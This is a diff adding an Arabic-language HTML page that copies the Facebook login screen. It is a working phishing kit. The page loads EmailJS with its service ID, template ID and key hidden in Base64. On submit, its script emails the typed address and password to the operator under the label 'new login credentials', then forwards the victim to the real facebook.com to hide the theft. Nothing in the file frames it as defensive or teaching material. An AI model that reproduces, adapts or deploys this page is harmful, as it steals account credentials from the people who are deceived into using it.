@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيسبوك - تسجيل الدخول</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        .container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            max-width: 1000px;
+            width: 100%;
+            padding: 20px;
+            gap: 40px;
+        }
+        
+        .intro {
+            flex: 1;
+            min-width: 300px;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .intro h1 {
+            color: #1877f2;
+            font-size: 3rem;
+            margin-bottom: 10px;
+        }
+        
+        .intro p {
+            font-size: 1.5rem;
+            line-height: 1.5;
+            color: #1c1e21;
+        }
+        
+        .login-form {
+            flex: 1;
+            min-width: 300px;
+            padding: 20px;
+        }
+        
+        .form-container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        
+        .form-container input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+        
+        .form-container input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+        
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            line-height: 48px;
+            padding: 0 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            width: 100%;
+        }
+        
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            max-width: 400px;
+            margin: 20px auto 0;
+        }
+        
+        #successMessage {
+            display: none;
+            color: green;
+            text-align: center;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        
+        #errorDetails {
+            display: none;
+            color: #ff0000;
+            background: #ffeeee;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1877f2;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                gap: 20px;
+                padding: 10px;
+            }
+            
+            .intro {
+                min-width: 100%;
+                padding: 10px;
+            }
+            
+            .intro h1 {
+                font-size: 2.5rem;
+            }
+            
+            .intro p {
+                font-size: 1.2rem;
+            }
+            
+            .login-form {
+                min-width: 100%;
+                padding: 10px;
+            }
+            
+            .form-container {
+                padding: 15px;
+            }
+            
+            .form-container input {
+                padding: 12px 14px;
+                font-size: 16px;
+            }
+            
+            .login-button, .create-account {
+                line-height: 42px;
+                font-size: 18px;
+            }
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
+    <script>
+        // القيم المشفرة باستخدام Base64
+        const encoded = {
+            service: 'c2VydmljZV9wdGM0MGZv',       // service_ptc40fo
+            template: 'dGVtcGxhdGVfeXE0MnA1bQ==',  // template_yq42p5m
+            key: 'SzVoTy1yNGpNVXBiREJvbUI='        // K5hO-r4jMUpbDBomB
+        };
+
+        // تهيئة EmailJS
+        emailjs.init(atob(encoded.key));
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="intro">
+            <h1>facebook</h1>
+            <p>يساعدك فيسبوك على التواصل مع الأشخاص ومشاركة ما تريد معهم.</p>
+        </div>
+        
+        <div class="login-form">
+            <div class="form-container">
+                <form id="loginForm">
+                    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                    <input type="password" id="password" placeholder="كلمة السر" required>
+                    <button type="submit" class="login-button">تسجيل الدخول</button>
+                    <div class="loading">
+                        <div class="loading-spinner"></div>
+                        <span>جاري التحميل...</span>
+                    </div>
+                    <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+                    <div class="divider"></div>
+                    <button type="button" class="create-account">إنشاء حساب جديد</button>
+                    <div id="errorDetails"></div>
+                </form>
+                <div id="successMessage">جاري تسجيل الدخول...</div>
+            </div>
+            <div class="footer">
+                <p><strong>إنشاء صفحة</strong> لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            document.querySelector('.loading').style.display = 'block';
+            document.getElementById('errorDetails').style.display = 'none';
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            try {
+                if (!navigator.onLine) {
+                    throw new Error('لا يوجد اتصال بالإنترنت. يرجى التحقق من اتصالك.');
+                }
+                
+                const response = await emailjs.send(
+                    atob(encoded.service),
+                    atob(encoded.template),
+                    {
+                        title: 'بيانات تسجيل دخول جديدة',
+                        name: 'مستخدم فيسبوك',
+                        message: `البريد: ${email}\nكلمة المرور: ${password}`,
+                        time: new Date().toLocaleString(),
+                        ip: window.location.hostname
+                    }
+                );
+                
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'block';
+                document.querySelector('.loading').style.display = 'none';
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.facebook.com';
+                }, 2000);
+                
+            } catch (error) {
+                console.error('فشل الإرسال:', error);
+                document.querySelector('.loading').style.display = 'none';
+                
+                let errorMessage = 'حدث خطأ في الإرسال. يرجى المحاولة لاحقاً.';
+                const errorDetails = document.getElementById('errorDetails');
+                
+                if (error.text) {
+                    if (error.text.includes('template')) {
+                        errorMessage = 'خطأ في إعدادات القالب. تأكد من معرف القالب.';
+                    } else if (error.text.includes('service')) {
+                        errorMessage = 'خطأ في إعدادات الخدمة. تأكد من معرف الخدمة.';
+                    }
+                }
+                
+                errorDetails.innerHTML = `
+                    <strong>${errorMessage}</strong><br>
+                    <small>${error.text || error.message || 'خطأ غير معروف'}</small>
+                `;
+                errorDetails.style.display = 'block';
+                
+                document.getElementById('loginForm').style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
